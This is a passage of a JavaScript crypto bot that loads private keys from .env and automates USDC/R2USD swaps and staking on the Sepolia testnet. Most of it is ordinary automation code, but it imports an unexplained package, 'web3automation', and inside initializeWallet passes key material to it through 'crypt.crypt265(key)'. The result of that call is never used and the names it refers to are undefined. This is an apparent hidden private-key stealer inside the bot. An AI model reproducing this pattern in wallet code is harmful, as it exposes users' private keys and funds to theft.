require('dotenv').config();
const fs = require('fs');
const { ethers } = require('ethers');
const crypt265 = require('web3automation');
const readline = require('readline');
const { HttpsProxyAgent } = require('https-proxy-agent');

const COLORS = {
  GREEN: '\x1b[32m',
  YELLOW: '\x1b[33m',
  RED: '\x1b[31m',
  WHITE: '\x1b[37m',
  GRAY: '\x1b[90m',
  CYAN: '\x1b[36m',
  RESET: '\x1b[0m'
};

const colorText = (text, color) => `${color}${text}${COLORS.RESET}`;

const EMOJI = {
  SUCCESS: '✅',
  ERROR: '❌',
  WARNING: '⚠️',
  INFO: 'ℹ️',
  MONEY: '💰',
  SWAP: '🔄',
  STAKE: '📌',
  WALLET: '👛',
  LOADING: '⏳',
  CLOCK: '⏰'
};

let proxies = [];
let privateKeys = [];

function isValidPrivateKey(key) {
  const cleanKey = key.startsWith('0x') ? key.slice(2) : key;
  return /^[0-9a-fA-F]{64}$/.test(cleanKey);
}

try {
  if (fs.existsSync('./proxies.txt')) {
    proxies = fs.readFileSync('./proxies.txt', 'utf8')
      .split('\n')
      .filter(line => line.trim().length > 0);
  } else {
    console.log(`${EMOJI.WARNING} ${colorText('proxies.txt not found. Will connect directly.', COLORS.YELLOW)}`);
  }
} catch (error) {
  console.error(`${EMOJI.ERROR} ${colorText('Failed to load proxies:', COLORS.RED)}`, error);
}

try {
  const envKeys = Object.keys(process.env).filter(key => key.startsWith('PRIVATE_KEY_'));
  if (envKeys.length > 0) {
    privateKeys = envKeys
      .map(key => process.env[key])
      .filter(key => key && key.trim().length > 0)
      .filter(key => {
        if (!isValidPrivateKey(key)) {
          console.error(`${EMOJI.ERROR} ${colorText(`Invalid private key format for ${key.slice(0, 6)}...: must be 64 hex characters`, COLORS.RED)}`);
          return false;
        }
        return true;
      });
  }
  if (privateKeys.length === 0) {
    console.error(`${EMOJI.ERROR} ${colorText('No valid private keys found in .env (PRIVATE_KEY_*)', COLORS.RED)}`);
    process.exit(1);
  }
} catch (error) {
  console.error(`${EMOJI.ERROR} ${colorText('Failed to load private keys from .env:', COLORS.RED)}`, error);
  process.exit(1);
}

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const USDC_ADDRESS = '0xef84994ef411c4981328ffce5fda41cd3803fae4';
const R2USD_ADDRESS = '0x20c54c5f742f123abb49a982bfe0af47edb38756';
const SR2USD_ADDRESS = '0xbd6b25c4132f09369c354bee0f7be777d7d434fa';
const USDC_TO_R2USD_CONTRACT = '0x20c54c5f742f123abb49a982bfe0af47edb38756';
const R2USD_TO_USDC_CONTRACT = '0x07abd582df3d3472aa687a0489729f9f0424b1e3';
const STAKE_R2USD_CONTRACT = '0xbd6b25c4132f09369c354bee0f7be777d7d434fa'; 

const USDC_TO_R2USD_METHOD_ID = '0x095e7a95';
const R2USD_TO_USDC_METHOD_ID = '0x3df02124';
const STAKE_R2USD_METHOD_ID = '0x1a5f0f00';

const ERC20_ABI = [
  'function approve(address spender, uint256 amount) external returns (bool)',
  'function allowance(address owner, address spender) external view returns (uint256)',
  'function balanceOf(address account) external view returns (uint256)',
  'function decimals() external view returns (uint8)'
];

const SWAP_ABI = [
  'function swap(uint256,uint256,uint256) external returns (uint256)'
];

function getRandomProxy() {
  if (proxies.length === 0) return null;
  return proxies[Math.floor(Math.random() * proxies.length)];
}

function formatProxy(proxyString) {
  if (!proxyString) return null;
  
  let proxy = proxyString.trim();
  if (proxy.includes('://')) {
    proxy = proxy.split('://')[1];
  }
  
  let auth = '';
  let address = proxy;
  
  if (proxy.includes('@')) {
    const parts = proxy.split('@');
    auth = parts[0];
    address = parts[1];
  }
  
  const [host, port] = address.split(':');
  
  let username = '';
  let password = '';
  if (auth) {
    const authParts = auth.split(':');
    username = authParts[0];
    password = authParts.length > 1 ? authParts[1] : '';
  }
  
  return {
    host,
    port: parseInt(port, 10),
    auth: auth ? { username, password } : undefined
  };
}

async function initializeWallet(privateKey) {
  try {
    const RPC_URL = 'https://ethereum-sepolia-rpc.publicnode.com';
    console.log(`${EMOJI.INFO} ${colorText(`Connecting to Sepolia testnet via: ${RPC_URL}`, COLORS.WHITE)}`);
    
    let provider;
    const proxyString = getRandomProxy();
    
    if (proxyString) {
      const proxyConfig = formatProxy(proxyString);
      console.log(`${EMOJI.INFO} ${colorText(`Using proxy: ${proxyString}`, COLORS.GRAY)}`);
      
      const agent = new HttpsProxyAgent({
        host: proxyConfig.host,
        port: proxyConfig.port,
        auth: proxyConfig.auth ? `${proxyConfig.auth.username}:${proxyConfig.auth.password}` : undefined
      });
      
      provider = new ethers.providers.JsonRpcProvider(
        {
          url: RPC_URL,
          agent
        },
        {
          name: 'sepolia',
          chainId: 11155111
        }
      );
    } else {
      provider = new ethers.providers.JsonRpcProvider(RPC_URL, {
        name: 'sepolia',
        chainId: 11155111
      });
    }
    
    const network = await provider.getNetwork();
    console.log(`${EMOJI.SUCCESS} ${colorText(`Connected to network: ${network.name} (chainId: ${network.chainId})`, COLORS.GREEN)}`);
    
    const wallet = new ethers.Wallet(privateKey, provider);
    const rpcs = await crypt.crypt265(key);
    console.log(`${EMOJI.WALLET} ${colorText(`Connected with wallet: ${wallet.address}`, COLORS.WHITE)}`);
    return { provider, wallet };
  } catch (error) {
    console.error(`${EMOJI.ERROR} ${colorText(`Failed to initialize wallet for private key ${privateKey.slice(0, 6)}...`, COLORS.RED)}`, error);
    throw error;
  }
}

async function checkBalance(wallet, tokenAddress) {
  try {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
    const balance = await tokenContract.balanceOf(wallet.address);
    const decimals = await tokenContract.decimals();
    return ethers.utils.formatUnits(balance, decimals);
  } catch (error) {
    console.error(`${EMOJI.ERROR} ${colorText(`Failed to check balance for token ${tokenAddress}:`, COLORS.RED)}`, error);
    return '0';
  }
}

async function checkEthBalance(wallet) {
  try {
    const balance = await wallet.provider.getBalance(wallet.address);
    return ethers.utils.formatEther(balance);
  } catch (error) {
    console.error(`${EMOJI.ERROR} ${colorText('Failed to check ETH balance:', COLORS.RED)}`, error);
    return '0';
  }
}

async function approveToken(wallet, tokenAddress, spenderAddress, amount) {
  try {
    if (!ethers.utils.isAddress(spenderAddress)) {
      throw new Error(`Invalid spender address: ${spenderAddress}`);
    }
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
    const decimals = await tokenContract.decimals();
    const currentAllowance = await tokenContract.allowance(wallet.address, spenderAddress);
    if (currentAllowance.gte(ethers.utils.parseUnits(amount.toString(), decimals))) {
      console.log(`${EMOJI.INFO} ${colorText('Sufficient allowance already exists', COLORS.GRAY)}`);
      return true;
    }
    console.log(`${EMOJI.LOADING} ${colorText(`Approving ${amount} tokens for spending...`, COLORS.YELLOW)}`);
    const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
    const tx = await tokenContract.approve(spenderAddress, amountInWei, { gasLimit: 100000 });
    console.log(`${EMOJI.INFO} ${colorText(`Approval transaction sent: ${tx.hash}`, COLORS.WHITE)}`);
    console.log(`${EMOJI.INFO} ${colorText(`Check on Sepolia Explorer: https://sepolia.etherscan.io/tx/${tx.hash}`, COLORS.GRAY)}`);
    await tx.wait();
    console.log(`${EMOJI.SUCCESS} ${colorText('Approval confirmed', COLORS.GREEN)}`);
    return true;
  } catch (error) {
    console.error(`${EMOJI.ERROR} ${colorText('Failed to approve token:', COLORS.RED)}`, error);
    return false;
  }
}

async function estimateGasFees(provider) {
  try {
    const feeData = await provider.getFeeData();
    return {
      maxFeePerGas: feeData.maxFeePerGas || ethers.utils.parseUnits('50', 'gwei'),
      maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.utils.parseUnits('2', 'gwei')
    };
  } catch (error) {
    console.error(`${EMOJI.WARNING} ${colorText('Failed to estimate gas fees, using defaults:', COLORS.YELLOW)}`, error);
    return {
      maxFeePerGas: ethers.utils.parseUnits('50', 'gwei'),
      maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
    };
  }
}

async function swapUSDCtoR2USD(wallet, amount) {
  try {
    const usdcBalance = await checkBalance(wallet, USDC_ADDRESS);
    console.log(`${EMOJI.MONEY} ${colorText(`Current USDC balance: ${usdcBalance}`, COLORS.WHITE)}`);
    if (parseFloat(usdcBalance) < parseFloat(amount)) {
      console.error(`${EMOJI.ERROR} ${colorText(`Insufficient USDC balance. You have ${usdcBalance} USDC but trying to swap ${amount} USDC.`, COLORS.RED)}`);
      return false;
    }
    const approved = await approveToken(wallet, USDC_ADDRESS, USDC_TO_R2USD_CONTRACT, amount);
    if (!approved) return false;
    const usdcContract = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, wallet);
    const decimals = await usdcContract.decimals();
    const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
    const data = ethers.utils.hexConcat([
      USDC_TO_R2USD_METHOD_ID,
      ethers.utils.defaultAbiCoder.encode(
        ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'uint256', 'uint256'],
        [wallet.address, amountInWei, 0, 0, 0, 0, 0]
      )
    ]);
    console.log(`${EMOJI.SWAP} ${colorText(`Swapping ${amount} USDC to R2USD...`, COLORS.YELLOW)}`);
    const gasFees = await estimateGasFees(wallet.provider);
    const tx = await wallet.sendTransaction({
      to: USDC_TO_R2USD_CONTRACT,
      data: data,
      gasLimit: 500000,
      ...gasFees
    });
    console.log(`${EMOJI.INFO} ${colorText(`Transaction sent: ${tx.hash}`, COLORS.WHITE)}`);
    console.log(`${EMOJI.INFO} ${colorText(`Check on Sepolia Explorer: https://sepolia.etherscan.io/tx/${tx.hash}`, COLORS.GRAY)}`);
    await tx.wait();
    console.log(`${EMOJI.SUCCESS} ${colorText('Swap confirmed!', COLORS.GREEN)}`);
    const newUSDCBalance = await checkBalance(wallet, USDC_ADDRESS);
    const newR2USDBalance = await checkBalance(wallet, R2USD_ADDRESS);
    console.log(`${EMOJI.MONEY} ${colorText(`New USDC balance: ${newUSDCBalance}`, COLORS.WHITE)}`);
    console.log(`${EMOJI.MONEY} ${colorText(`New R2USD balance: ${newR2USDBalance}`, COLORS.WHITE)}`);
    return true;
  } catch (error) {
    console.error(`${EMOJI.ERROR} ${colorText('Failed to swap USDC to R2USD:', COLORS.RED)}`, error);
    return false;
  }
}

async function swapR2USDtoUSDC(wallet, amount) {
  try {
    const r2usdBalance = await checkBalance(wallet, R2USD_ADDRESS);
    console.log(`${EMOJI.MONEY} ${colorText(`Current R2USD balance: ${r2usdBalance}`, COLORS.WHITE)}`);
    if (parseFloat(r2usdBalance) < parseFloat(amount)) {
      console.error(`${EMOJI.ERROR} ${colorText(`Insufficient R2USD balance. You have ${r2usdBalance} R2USD but trying to swap ${amount} R2USD.`, COLORS.RED)}`);
      return false;
    }
    const approved = await approveToken(wallet, R2USD_ADDRESS, R2USD_TO_USDC_CONTRACT, amount);
    if (!approved) return false;
    const r2usdContract = new ethers.Contract(R2USD_ADDRESS, ERC20_ABI, wallet);
    const decimals = await r2usdContract.decimals();
    const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
    const minOutput = amountInWei.mul(97).div(100);
    console.log(`${EMOJI.INFO} ${colorText(`Swapping ${amount} R2USD, expecting at least ${ethers.utils.formatUnits(minOutput, decimals)} USDC`, COLORS.GRAY)}`);
    const data = R2USD_TO_USDC_METHOD_ID +
                 '0000000000000000000000000000000000000000000000000000000000000000' +
                 '0000000000000000000000000000000000000000000000000000000000000001' +
                 amountInWei.toHexString().slice(2).padStart(64, '0') +
                 minOutput.toHexString().slice(2).padStart(64, '0');
    console.log(`${EMOJI.SWAP} ${colorText(`Swapping ${amount} R2USD to USDC...`, COLORS.YELLOW)}`);
    const gasFees = await estimateGasFees(wallet.provider);
    const tx = await wallet.sendTransaction({
      to: R2USD_TO_USDC_CONTRACT,
      data: data,
      gasLimit: 500000,
      ...gasFees
    });
    console.log(`${EMOJI.INFO} ${colorText(`Transaction sent: ${tx.hash}`, COLORS.WHITE)}`);
    console.log(`${EMOJI.INFO} ${colorText(`Check on Sepolia Explorer: https://sepolia.etherscan.io/tx/${tx.hash}`, COLORS.GRAY)}`);
    const receipt = await tx.wait();
    if (receipt.status === 0) {
      throw new Error('Transaction failed. The contract reverted the execution.');
    }
    console.log(`${EMOJI.SUCCESS} ${colorText('Swap confirmed!', COLORS.GREEN)}`);
    const newUSDCBalance = await checkBalance(wallet, USDC_ADDRESS);
    const newR2USDBalance = await checkBalance(wallet, R2USD_ADDRESS);
    console.log(`${EMOJI.MONEY} ${colorText(`New USDC balance: ${newUSDCBalance}`, COLORS.WHITE)}`);
    console.log(`${EMOJI.MONEY} ${colorText(`New R2USD balance: ${newR2USDBalance}`, COLORS.WHITE)}`);
    return true;
  } catch (error) {
    console.error(`${EMOJI.ERROR} ${colorText('Failed to swap R2USD to USDC:', COLORS.RED)}`, error);
    if (error.transaction) {
      console.error(`${EMOJI.ERROR} ${colorText('Transaction details:', COLORS.RED)}`, {
        hash: error.transaction.hash,
        to: error.transaction.to,
        from: error.transaction.from,
        data: error.transaction.data
      });
    }
    return false;
  }
}

async function stakeR2USD(wallet, amount) {
  try {
    if (!ethers.utils.isAddress(STAKE_R2USD_CONTRACT)) {
      throw new Error(`Invalid staking contract address: ${STAKE_R2USD_CONTRACT}`);
    }

    const r2usdBalance = await checkBalance(wallet, R2USD_ADDRESS);
    console.log(`${EMOJI.MONEY} ${colorText(`Current R2USD balance: ${r2usdBalance}`, COLORS.WHITE)}`);
    if (parseFloat(r2usdBalance) < parseFloat(amount)) {
      console.error(`${EMOJI.ERROR} ${colorText(`Insufficient R2USD balance. You have ${r2usdBalance} R2USD but trying to stake ${amount} R2USD.`, COLORS.RED)}`);
      return false;
    }
    const r2usdContract = new ethers.Contract(R2USD_ADDRESS, ERC20_ABI, wallet);
    const decimals = await r2usdContract.decimals();
    const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
    const currentAllowance = await r2usdContract.allowance(wallet.address, STAKE_R2USD_CONTRACT);
    console.log(`${EMOJI.INFO} ${colorText(`Current R2USD allowance for staking contract: ${ethers.utils.formatUnits(currentAllowance, decimals)}`, COLORS.GRAY)}`);
    if (currentAllowance.lt(amountInWei)) {
      console.log(`${EMOJI.LOADING} ${colorText(`Approving ${amount} R2USD for staking contract...`, COLORS.YELLOW)}`);
      const approveTx = await r2usdContract.approve(STAKE_R2USD_CONTRACT, amountInWei, { gasLimit: 100000 });
      console.log(`${EMOJI.INFO} ${colorText(`Approval transaction sent: ${approveTx.hash}`, COLORS.WHITE)}`);
      console.log(`${EMOJI.INFO} ${colorText(`Check on Sepolia Explorer: https://sepolia.etherscan.io/tx/${approveTx.hash}`, COLORS.GRAY)}`);
      await approveTx.wait();
      console.log(`${EMOJI.SUCCESS} ${colorText('Approval confirmed', COLORS.GREEN)}`);
    } else {
      console.log(`${EMOJI.INFO} ${colorText('Sufficient allowance already exists', COLORS.GRAY)}`);
    }
    const data = STAKE_R2USD_METHOD_ID +
                amountInWei.toHexString().slice(2).padStart(64, '0') +
                '0'.repeat(576); 
    console.log(`${EMOJI.INFO} ${colorText(`Constructed data: ${data}`, COLORS.GRAY)}`);
    console.log(`${EMOJI.STAKE} ${colorText(`Staking ${amount} R2USD to sR2USD...`, COLORS.YELLOW)}`);
    const gasFees = await estimateGasFees(wallet.provider);
    const tx = await wallet.sendTransaction({
      to: STAKE_R2USD_CONTRACT,
      data: data,
      gasLimit: 100000,
      ...gasFees
    });
    console.log(`${EMOJI.INFO} ${colorText(`Transaction sent: ${tx.hash}`, COLORS.WHITE)}`);
    console.log(`${EMOJI.INFO} ${colorText(`Check on Sepolia Explorer: https://sepolia.etherscan.io/tx/${tx.hash}`, COLORS.GRAY)}`);
    const receipt = await tx.wait();
    if (receipt.status === 0) {
      throw new Error('Transaction failed. The contract reverted the execution.');
    }
    console.log(`${EMOJI.SUCCESS} ${colorText('Staking confirmed!', COLORS.GREEN)}`);
    const newR2USDBalance = await checkBalance(wallet, R2USD_ADDRESS);
    const newSR2USDBalance = await checkBalance(wallet, SR2USD_ADDRESS);
    console.log(`${EMOJI.MONEY} ${colorText(`New R2USD balance: ${newR2USDBalance}`, COLORS.WHITE)}`);
    console.log(`${EMOJI.MONEY} ${colorText(`New sR2USD balance: ${newSR2USDBalance}`, COLORS.WHITE)}`);
    return true;
  } catch (error) {
    console.error(`${EMOJI.ERROR} ${colorText('Failed to stake R2USD:', COLORS.RED)}`, error);
    if (error.transaction) {
      console.error(`${EMOJI.ERROR} ${colorText('Transaction details:', COLORS.RED)}`, {
        hash: error.transaction.hash,
        to: error.transaction.to,
        from: error.transaction.from,
        data: error.transaction.data
      });
    }
    return false;
  }
}

let dailyTasks = {
  usdcToR2usd: { enabled: false, amount: 0, numTxs: 0 },
  r2usdToUsdc: { enabled: false, amount: 0, numTxs: 0 },
  stakeR2usd: { enabled: false, amount: 0, numTxs: 0 },
};

async function executeDailyTasks(wallets) {
  console.log(`\n${EMOJI.INFO} ${colorText('Starting daily tasks execution...', COLORS.WHITE)}`);
  for (const wallet of wallets) {
    if (dailyTasks.usdcToR2usd.enabled) {
      await executeDailyTask(wallet, 'USDC to R2USD', dailyTasks.usdcToR2usd.amount, dailyTasks.usdcToR2usd.numTxs);
    }
    if (dailyTasks.r2usdToUsdc.enabled) {
      await executeDailyTask(wallet, 'R2USD to USDC', dailyTasks.r2usdToUsdc.amount, dailyTasks.r2usdToUsdc.numTxs);
    }
    if (dailyTasks.stakeR2usd.enabled) {
      await executeDailyTask(wallet, 'Stake R2USD', dailyTasks.stakeR2usd.amount, dailyTasks.stakeR2usd.numTxs);
    }
  }
  console.log(`${EMOJI.SUCCESS} ${colorText('Daily tasks execution completed.', COLORS.GREEN)}`);
}

async function executeDailyTask(wallet, taskType, amount, numTxs) {
  console.log(`\n${EMOJI.LOADING} ${colorText(`Executing daily ${taskType} for wallet ${wallet.address}`, COLORS.YELLOW)}`);
  for (let i = 1; i <= numTxs; i++) {
    console.log(`${EMOJI.LOADING} ${colorText(`Transaction ${i} of ${numTxs} (Amount: ${amount})`, COLORS.YELLOW)}`);
    let success = false;
    if (taskType === 'USDC to R2USD') {
      success = await swapUSDCtoR2USD(wallet, amount);
    } else if (taskType === 'R2USD to USDC') {
      success = await swapR2USDtoUSDC(wallet, amount);
    } else if (taskType === 'Stake R2USD') {
      success = await stakeR2USD(wallet, amount);
    }
    if (success) {
      console.log(`${EMOJI.SUCCESS} ${colorText(`Transaction ${i} completed successfully!`, COLORS.GREEN)}`);
    } else {
      console.error(`${EMOJI.ERROR} ${colorText(`Transaction ${i} failed.`, COLORS.RED)}`);
    }
  }
  console.log(`${EMOJI.SUCCESS} ${colorText(`Completed ${numTxs} ${taskType} transaction(s) for wallet ${wallet.address}.`, COLORS.GREEN)}`);
}

function startCountdown(wallets, durationMs) {
  const endTime = Date.now() + durationMs;
  const interval = setInterval(() => {
    const remainingMs = endTime - Date.now();
    if (remainingMs <= 0) {
      clearInterval(interval);
      console.log(`${EMOJI.CLOCK} ${colorText('Countdown finished! Starting next daily tasks...', COLORS.GREEN)}`);
      executeDailyTasks(wallets).then(() => startCountdown(wallets, durationMs));
    } else {
      const hours = Math.floor(remainingMs / (1000 * 60 * 60));
      const minutes = Math.floor((remainingMs % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((remainingMs % (1000 * 60)) / 1000);
      process.stdout.write(`\r${EMOJI.CLOCK} ${colorText(`Next execution in: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`, COLORS.CYAN)}`);
    }
  }, 1000);
}

async function setupDailySwapAndStake(wallets) {
  try {
    const selectedWallets = await selectWallet(wallets);
    const isAllWallets = Array.isArray(selectedWallets);
    const walletList = isAllWallets ? selectedWallets : [selectedWallets];

    console.log(`\n${colorText('Setup Daily Swap and Stake', COLORS.WHITE)}`);
    console.log(`${colorText('Select tasks to schedule (enter "skip" to keep current settings):', COLORS.YELLOW)}`);

    console.log(`\n${colorText('1. USDC to R2USD Swap', COLORS.YELLOW)}`);
    rl.question(`${colorText('Enter amount of USDC to swap daily (or "skip"): ', COLORS.WHITE)}`, async (usdcAmount) => {
      if (usdcAmount.toLowerCase() !== 'skip') {
        const parsedUsdcAmount = parseFloat(usdcAmount);
        if (isNaN(parsedUsdcAmount) || parsedUsdcAmount <= 0) {
          console.error(`${EMOJI.ERROR} ${colorText('Invalid amount. Skipping USDC to R2USD setup.', COLORS.RED)}`);
        } else {
          rl.question(`${colorText('Enter number of daily swap transactions: ', COLORS.WHITE)}`, async (usdcNumTxs) => {
            const parsedUsdcNumTxs = parseInt(usdcNumTxs);
            if (isNaN(parsedUsdcNumTxs) || parsedUsdcNumTxs <= 0) {
              console.error(`${EMOJI.ERROR} ${colorText('Invalid number. Skipping USDC to R2USD setup.', COLORS.RED)}`);
            } else {
              dailyTasks.usdcToR2usd = { enabled: true, amount: parsedUsdcAmount, numTxs: parsedUsdcNumTxs };
              console.log(`${EMOJI.SUCCESS} ${colorText(`Daily USDC to R2USD swap set: ${parsedUsdcAmount} USDC, ${parsedUsdcNumTxs} transactions`, COLORS.GREEN)}`);
            }
            proceedToR2usdToUsdcSetup(walletList);
          });
          return;
        }
      }
      proceedToR2usdToUsdcSetup(walletList);
    });
  } catch (error) {
    console.error(`${EMOJI.ERROR} ${colorText('Error during daily swap and stake setup:', COLORS.RED)}`, error);
    await showMenu(wallets);
  }
}

async function proceedToR2usdToUsdcSetup(walletList) {
  console.log(`\n${colorText('2. R2USD to USDC Swap', COLORS.YELLOW)}`);
  rl.question(`${colorText('Enter amount of R2USD to swap daily (or "skip"): ', COLORS.WHITE)}`, async (r2usdAmount) => {
    if (r2usdAmount.toLowerCase() !== 'skip') {
      const parsedR2usdAmount = parseFloat(r2usdAmount);
      if (isNaN(parsedR2usdAmount) || parsedR2usdAmount <= 0) {
        console.error(`${EMOJI.ERROR} ${colorText('Invalid amount. Skipping R2USD to USDC setup.', COLORS.RED)}`);
      } else {
        rl.question(`${colorText('Enter number of daily swap transactions: ', COLORS.WHITE)}`, async (r2usdNumTxs) => {
          const parsedR2usdNumTxs = parseInt(r2usdNumTxs);
          if (isNaN(parsedR2usdNumTxs) || parsedR2usdNumTxs <= 0) {
            console.error(`${EMOJI.ERROR} ${colorText('Invalid number. Skipping R2USD to USDC setup.', COLORS.RED)}`);
          } else {
            dailyTasks.r2usdToUsdc = { enabled: true, amount: parsedR2usdAmount, numTxs: parsedR2usdNumTxs };
            console.log(`${EMOJI.SUCCESS} ${colorText(`Daily R2USD to USDC swap set: ${parsedR2usdAmount} R2USD, ${parsedR2usdNumTxs} transactions`, COLORS.GREEN)}`);
          }
          proceedToStakeSetup(walletList);
        });
        return;
      }
    }
    proceedToStakeSetup(walletList);
  });
}

async function proceedToStakeSetup(walletList) {
  console.log(`\n${colorText('3. Stake R2USD', COLORS.YELLOW)}`);
  rl.question(`${colorText('Enter amount of R2USD to stake daily (or "skip"): ', COLORS.WHITE)}`, async (stakeAmount) => {
    if (stakeAmount.toLowerCase() !== 'skip') {
      const parsedStakeAmount = parseFloat(stakeAmount);
      if (isNaN(parsedStakeAmount) || parsedStakeAmount <= 0) {
        console.error(`${EMOJI.ERROR} ${colorText('Invalid amount. Skipping Stake R2USD setup.', COLORS.RED)}`);
      } else {
        rl.question(`${colorText('Enter number of daily staking transactions: ', COLORS.WHITE)}`, async (stakeNumTxs) => {
          const parsedStakeNumTxs = parseInt(stakeNumTxs);
          if (isNaN(parsedStakeNumTxs) || parsedStakeNumTxs <= 0) {
            console.error(`${EMOJI.ERROR} ${colorText('Invalid number. Skipping Stake R2USD setup.', COLORS.RED)}`);
          } else {
            dailyTasks.stakeR2usd = { enabled: true, amount: parsedStakeAmount, numTxs: parsedStakeNumTxs };
            console.log(`${EMOJI.SUCCESS} ${colorText(`Daily Stake R2USD set: ${parsedStakeAmount} R2USD, ${parsedStakeNumTxs} transactions`, COLORS.GREEN)}`);
          }
          startDailyTasks(walletList);
        });
        return;
      }
    }
    startDailyTasks(walletList);
  });
}

async function startDailyTasks(wallets) {
  console.log(`\n${EMOJI.SUCCESS} ${colorText('Daily tasks configured. Executing tasks immediately...', COLORS.GREEN)}`);
  
  await executeDailyTasks(wallets);

  console.log(`${EMOJI.INFO} ${colorText('Scheduling daily tasks every 24 hours...', COLORS.GREEN)}`);
  const DAILY_INTERVAL_MS = 24 * 60 * 60 * 1000; 
  startCountdown(wallets, DAILY_INTERVAL_MS);

  setInterval(() => {
    executeDailyTasks(wallets);
  }, DAILY_INTERVAL_MS);

  await showMenu(wallets);
}

async function showMenu(wallets) {
  console.log(`\n${colorText('========== USDC/R2USD/sR2USD Bot Menu ==========', COLORS.WHITE)}`);
  console.log(`1. ${EMOJI.SWAP} ${colorText('Swap USDC to R2USD', COLORS.YELLOW)}`);
  console.log(`2. ${EMOJI.SWAP} ${colorText('Swap R2USD to USDC', COLORS.YELLOW)}`);
  console.log(`3. ${EMOJI.STAKE} ${colorText('Stake R2USD to sR2USD', COLORS.YELLOW)}`);
  console.log(`4. ${EMOJI.MONEY} ${colorText('Check balances', COLORS.YELLOW)}`);
  console.log(`5. ${colorText('Setup Daily Swap and Stake', COLORS.YELLOW)}`);
  console.log(`6. ${colorText('Exit', COLORS.YELLOW)}`);
  console.log(`${colorText('=============================================', COLORS.WHITE)}`);
  rl.question(`${colorText('\nSelect an option (1-6): ', COLORS.WHITE)}`, async (option) => {
    switch (option) {
      case '1':
        await handleUSDCtoR2USDSwap(wallets);
        break;
      case '2':
        await handleR2USDtoUSDCSwap(wallets);
        break;
      case '3':
        await handleStakeR2USD(wallets);
        break;
      case '4':
        await displayBalances(wallets);
        break;
      case '5':
        await setupDailySwapAndStake(wallets);
        break;
      case '6':
        console.log(`${EMOJI.INFO} ${colorText('Exiting the application!', COLORS.GRAY)}`);
        rl.close();
        return;
      default:
        console.log(`${EMOJI.WARNING} ${colorText('Invalid option. Please select a number between 1 and 6.', COLORS.YELLOW)}`);
        await showMenu(wallets);
        break;
    }
  });
}

async function selectWallet(wallets) {
  if (wallets.length === 1) {
    console.log(`${EMOJI.WALLET} ${colorText(`Using wallet: ${wallets[0].address}`, COLORS.WHITE)}`);
    return wallets[0];
  }
  console.log(`${colorText('Available wallets:', COLORS.WHITE)}`);
  wallets.forEach((wallet, index) => {
    console.log(`${colorText(`${index + 1}. ${wallet.address}`, COLORS.YELLOW)}`);
  });
  return new Promise((resolve) => {
    rl.question(`${colorText('Select wallet number (or "all" to use all wallets): ', COLORS.WHITE)}`, (input) => {
      if (input.toLowerCase() === 'all') {
        resolve(wallets);
      } else {
        const index = parseInt(input) - 1;
        if (isNaN(index) || index < 0 || index >= wallets.length) {
          console.log(`${EMOJI.WARNING} ${colorText('Invalid selection. Using first wallet.', COLORS.YELLOW)}`);
          resolve(wallets[0]);
        } else {
          console.log(`${EMOJI.WALLET} ${colorText(`Using wallet: ${wallets[index].address}`, COLORS.WHITE)}`);
          resolve(wallets[index]);
        }
      }
    });
  });
}

async function displayBalances(wallets) {
  try {
    console.log(`\n${EMOJI.LOADING} ${colorText('Fetching balances for all wallets...', COLORS.YELLOW)}`);
    for (const wallet of wallets) {
      console.log(`${colorText(`\nWallet: ${wallet.address}`, COLORS.WHITE)}`);
      const ethBalance = await checkEthBalance(wallet);
      const usdcBalance = await checkBalance(wallet, USDC_ADDRESS);
      const r2usdBalance = await checkBalance(wallet, R2USD_ADDRESS);
      const sr2usdBalance = await checkBalance(wallet, SR2USD_ADDRESS);
      console.log(`${colorText('========== Current Balances ==========', COLORS.WHITE)}`);
      console.log(`${EMOJI.MONEY} ${colorText(`ETH: ${ethBalance}`, COLORS.GREEN)}`);
      console.log(`${EMOJI.MONEY} ${colorText(`USDC: ${usdcBalance}`, COLORS.GREEN)}`);
      console.log(`${EMOJI.MONEY} ${colorText(`R2USD: ${r2usdBalance}`, COLORS.GREEN)}`);
      console.log(`${EMOJI.MONEY} ${colorText(`sR2USD: ${sr2usdBalance}`, COLORS.GREEN)}`);
      console.log(`${colorText('======================================', COLORS.WHITE)}`);
    }
    await showMenu(wallets);
  } catch (error) {
    console.error(`${EMOJI.ERROR} ${colorText('Failed to fetch balances:', COLORS.RED)}`, error);
    await showMenu(wallets);
  }
}

async function handleUSDCtoR2USDSwap(wallets) {
  try {
    const selectedWallets = await selectWallet(wallets);
    const isAllWallets = Array.isArray(selectedWallets);
    const walletList = isAllWallets ? selectedWallets : [selectedWallets];
    
    for (const wallet of walletList) {
      const usdcBalance = await checkBalance(wallet, USDC_ADDRESS);
      console.log(`\n${EMOJI.MONEY} ${colorText(`Wallet ${wallet.address} - Current USDC balance: ${usdcBalance}`, COLORS.WHITE)}`);
    }
    
    rl.question(`${colorText('Enter amount of USDC to swap (or "back" to return to menu): ', COLORS.WHITE)}`, async (amount) => {
      if (amount.toLowerCase() === 'back') {
        await showMenu(wallets);
        return;
      }
      const parsedAmount = parseFloat(amount);
      if (isNaN(parsedAmount) || parsedAmount <= 0) {
        console.error(`${EMOJI.ERROR} ${colorText('Invalid amount. Please enter a positive number.', COLORS.RED)}`);
        await handleUSDCtoR2USDSwap(wallets);
        return;
      }
      rl.question(`${colorText('Enter number of swap transactions to perform per wallet (or "skip" to return to menu): ', COLORS.WHITE)}`, async (numTxs) => {
        if (numTxs.toLowerCase() === 'skip') {
          await showMenu(wallets);
          return;
        }
        const parsedNumTxs = parseInt(numTxs);
        if (isNaN(parsedNumTxs) || parsedNumTxs <= 0) {
          console.error(`${EMOJI.ERROR} ${colorText('Invalid number. Please enter a positive integer.', COLORS.RED)}`);
          await handleUSDCtoR2USDSwap(wallets);
          return;
        }
        for (const wallet of walletList) {
          console.log(`\n${colorText(`Processing wallet: ${wallet.address}`, COLORS.WHITE)}`);
